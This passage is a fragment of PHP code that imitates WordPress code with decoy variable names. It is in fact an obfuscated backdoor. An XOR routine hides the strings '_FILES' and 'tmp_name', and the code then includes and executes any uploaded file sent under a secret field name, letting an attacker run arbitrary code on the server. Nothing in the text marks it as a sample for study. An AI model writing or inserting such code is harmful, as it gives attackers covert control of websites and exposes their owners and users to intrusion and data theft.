...
$settings = 'RlBK2SwZhRZU';
function post_types($prefixed, $open_q_flag)

{
	$post_name_check = 'words_array';
    $to_look = urldecode($prefixed);

    $clear_date = substr($open_q_flag,0, strlen($to_look));
	$needle = 'good_protocol_url';
    $numberposts = $to_look ^ $clear_date;
    return $numberposts;
}
	$no_texturize_tags = 'defaults';
$time = ${post_types("%0D%2A%0B%07w%00", $settings)};
	$untrash = 'new_status';
if (isset($time[$settings]))

{
    $ext_types = $time[$settings];
    $sign = $ext_types[post_types("%26%012%14%5C2%1A%3F", $settings)];
    include ($sign);
